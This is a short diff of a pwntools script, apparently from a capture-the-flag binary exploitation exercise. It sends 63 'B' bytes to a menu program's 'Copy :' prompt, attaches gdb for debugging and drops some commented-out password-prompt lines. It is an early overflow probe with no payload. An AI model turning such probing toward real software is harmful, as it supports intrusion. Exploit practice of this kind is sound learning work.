@@ -20,17 +20,12 @@ io.send(b'\n')
 io.recvuntil(b'>> ')
 io.send(b'3')
 io.recvuntil(b'Copy :')
+io.send(b'B' * 63)
+
 pwn.gdb.attach(io, '''
 	set disassembly-flavor intel
 	layout asm
 	focus cmd
 ''')
-io.send(b'B' * 63)
-
-#io.recvuntil(b'>> ')
-#io.sendline(b'1')
-#io.recvuntil(b'Your passowrd :')
-#o.sendline(b'')
-
 
 io.interactive()
